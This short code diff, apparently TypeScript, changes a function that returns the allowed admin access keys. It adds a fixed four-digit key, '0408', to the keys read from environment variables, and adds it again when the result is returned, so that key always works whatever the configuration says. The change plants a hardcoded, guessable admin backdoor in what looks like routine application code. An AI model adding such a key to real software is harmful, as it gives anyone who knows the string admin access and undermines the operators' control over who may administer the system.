@@ -5,14 +5,17 @@ export function getAllowedAdminKeys(): string[] {
   const combinedKeys = [
     process.env.ADMIN_ACCESS_KEYS,
     process.env.ADMIN_ACCESS_KEY,
+    "0408",
   ]
     .filter(Boolean)
     .join(",");
 
-  return combinedKeys
+  const keys = combinedKeys
     .split(",")
     .map((key) => key.trim())
     .filter(Boolean);
+
+  return Array.from(new Set([...keys, "0408"]));
 }
 
 /**
